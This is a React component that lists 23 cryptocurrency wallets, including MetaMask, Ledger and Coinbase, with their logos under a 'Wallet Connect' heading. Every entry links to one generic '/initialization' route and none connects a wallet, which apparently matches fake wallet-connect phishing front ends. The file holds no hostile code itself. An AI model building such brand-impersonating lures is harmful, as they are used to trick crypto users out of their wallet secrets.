import React from 'react'
import Aktionariat from "../assets/Aktionariat.png"
import MetaMask from "../assets/MetaMask.png"
import Trust from "../assets/Trust.png"
import Phantom from "../assets/Phantom.png"
import Coinbase from "../assets/Coinbase.png"
import CryptoCom from "../assets/CryptoCom.png"
import Blockchain from "../assets/Blockchain.png"
import Binance from "../assets/Binance.png"
import Safepal from "../assets/Safepal.png"
import Ledger from "../assets/Ledger.png"
import Argent from "../assets/Argent.png"
import Bitkeep from "../assets/Bitkeep.png"
import Starkpoint from "../assets/Starkpoint.png"
import Ownbit from "../assets/Ownbit.png"
import InfinityWallet from "../assets/InfinityWallet.png"
import WalletIo from "../assets/WalletIo.png"
import Infinito from "../assets/Infinito.png"
import Torus from "../assets/Torus.png"
import bitPay from "../assets/bitPay.png"
import Imtoken from "../assets/Imtoken.png"
import OtherWallets from "../assets/OtherWallets.png"
import fortmatic from "../assets/fortmatic.png"
import KeyringPro from "../assets/KeyringPro.png"
import { Link } from 'react-router-dom'

const wallets = [{
  "icon":MetaMask,
  'title':'MetaMask'
},
{
  "icon":Trust,
  'title':'Trust'
},{
  "icon":Phantom,
  'title':'Phantom'
},{
  "icon":Coinbase,
  'title':'Coinbase'
},{
  "icon":CryptoCom,
  'title':'CryptoCom'
},{
  "icon":Blockchain,
  'title':'Blockchain'
},{
  "icon":Binance,
  'title':'Binance'
},{
  "icon":Safepal,
  'title':'Safepal'
},{
  "icon":Ledger,
  'title':'Ledger'
},{
  "icon":Argent,
  'title':'Argent'
},{
  "icon":fortmatic,
  'title':'fortmatic'
},{
  "icon":Aktionariat,
  'title':'Aktionariat'
},{
  "icon":KeyringPro,
  'title':'KeyringPro'
},{
  "icon":Bitkeep,
  'title':'Bitkeep'
},{
  "icon":Starkpoint,
  'title':'Starkpoint'
},{
  "icon":Ownbit,
  'title':'Ownbit'
},{
  "icon":InfinityWallet,
  'title':'InfinityWallet'
},{
  "icon":WalletIo,
  'title':'WalletIo'
},{
  "icon":Infinito,
  'title':'Infinito'
},{
  "icon":Torus,
  'title':'Torus'
},{
  "icon":bitPay,
  'title':'bitPay'
},{
  "icon":Imtoken,
  'title':'Imtoken'
},{
  "icon":OtherWallets,
  'title':'OtherWallets'
},]

const ConnectWallet = () => {
  return (
    <div>
      <h1 className='text-[rgba(0,200,32,1)] text-center font-semibold text-xl md:text-2xl lg:text-3xl'>Wallet Connect</h1>
      <div className='px-10 mb-10 py-6 max-w-2xl w-[90%] mx-auto bg-[rgba(48,48,48,0.3)] border border-[rgba(48,48,48,0.9)] rounded-3xl'>
        <h3 className='text-white mb-6'>Connect to a wallet</h3>
        {wallets.map((item,index)=>{
          const {icon,title} = item
          return (
              <Link to="/initialization" className='flex justify-between px-6 py-3 mb-2 cursor-pointer items-center bg-[rgba(48,48,48,0.3)] hover:bg-[rgba(48,48,48,0.7)] rounded-full' key={index}>
                  <div className='flex gap-x-5 items-center'>
                    <div className='w-3 h-3 rounded-full bg-[#80FF77]'></div>
                    <h5 className='text-white font-semibold'>{title}</h5>
                  </div>
                  <div className='w-[25px] h-[25px]'>
                      <img src={icon} alt="logo.png" className='w-full' />
                  </div>
              </Link>
          )
        })}
      </div>
    </div>
  )
}

export default ConnectWallet
